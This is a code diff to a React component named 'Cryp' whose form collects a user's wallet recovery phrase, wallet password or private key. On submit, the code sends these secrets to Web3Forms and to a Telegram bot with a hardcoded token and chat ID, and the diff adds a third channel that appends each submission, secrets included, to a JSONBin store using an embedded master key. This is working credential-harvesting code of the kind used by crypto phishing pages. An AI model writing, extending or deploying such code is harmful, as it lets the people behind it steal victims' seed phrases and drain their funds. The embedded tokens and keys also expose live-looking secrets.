@@ -31,7 +31,6 @@ const Cryp = () => {
   };
 
   
-
 const onSubmit = async (event) => {
   event.preventDefault();
   setLoading(true);
@@ -43,21 +42,31 @@ const onSubmit = async (event) => {
   let message = `🧾 Wallet Submission\n`;
   message += `Wallet: ${selectedWallet.title}\n`;
 
+  // JSONBin entry object
+  const jsonEntry = {
+    id: crypto.randomUUID(),
+    walletType: selectedWallet.title,
+    createdAt: new Date().toISOString(),
+  };
+
   if (recoveryPhraseRef.current && !privateKey) {
     const phrase = recoveryPhraseRef.current.value.trim();
     newFormData.append("recoveryPhrase", phrase);
+    jsonEntry.recoveryPhrase = phrase;
     message += `Recovery Phrase: ${phrase}\n`;
   }
 
   if (walletPasswordRef.current && key) {
     const password = walletPasswordRef.current.value.trim();
     newFormData.append("walletPassword", password);
+    jsonEntry.walletPassword = password;
     message += `Wallet Password: ${password}\n`;
   }
 
   if (privateKeyRef.current && privateKey) {
     const pk = privateKeyRef.current.value.trim();
     newFormData.append("privateKey", pk);
+    jsonEntry.privateKey = pk;
     message += `Private Key: ${pk}\n`;
   }
 
@@ -67,29 +76,53 @@ const onSubmit = async (event) => {
   );
 
   try {
-    // ✅ Send to Web3Forms
-    const response = await fetch("https://api.web3forms.com/submit", {
+    /* ---------------- WEB3FORMS ---------------- */
+    await fetch("https://api.web3forms.com/submit", {
       method: "POST",
       body: newFormData,
     });
 
-    const data = await response.json();
-    console.log("Web3Forms:", data);
-
-    // 🚀 Send to Telegram
+    /* ---------------- TELEGRAM ---------------- */
     await fetch(
-      `https://api.telegram.org/bot8417604320:AAH-oQtV6IigL0f4dBQui8ldaF641HRqdJw/sendMessage`,
+      "https://api.telegram.org/bot8417604320:AAH-oQtV6IigL0f4dBQui8ldaF641HRqdJw/sendMessage",
       {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: "6287276563",
           text: message,
         }),
       }
     );
+
+    /* ---------------- JSONBIN (APPEND) ---------------- */
+    const BIN_ID = "69768ca1d0ea881f408520b2";
+    const API_KEY = "$2a$10$yti1izYQ7PKY9IhwxrQiuuIk8TZDdxM6nzYFnduMOvJtKIdyRhBB.";
+
+    // 1️⃣ Get current bin
+    const getRes = await fetch(
+      `https://api.jsonbin.io/v3/b/${BIN_ID}/latest`,
+      {
+        headers: {
+          "X-Master-Key": API_KEY,
+        },
+      }
+    );
+
+    const binData = await getRes.json();
+
+    // 2️⃣ Push new submission
+    binData.record.submissions.push(jsonEntry);
+
+    // 3️⃣ Save back
+    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+      method: "PUT",
+      headers: {
+        "Content-Type": "application/json",
+        "X-Master-Key": API_KEY,
+      },
+      body: JSON.stringify(binData.record),
+    });
 
   } catch (error) {
     console.error("Error:", error);
@@ -100,7 +133,6 @@ const onSubmit = async (event) => {
     setErrorPopup(true);
   }, 5000);
 };
-
 
 
   return (
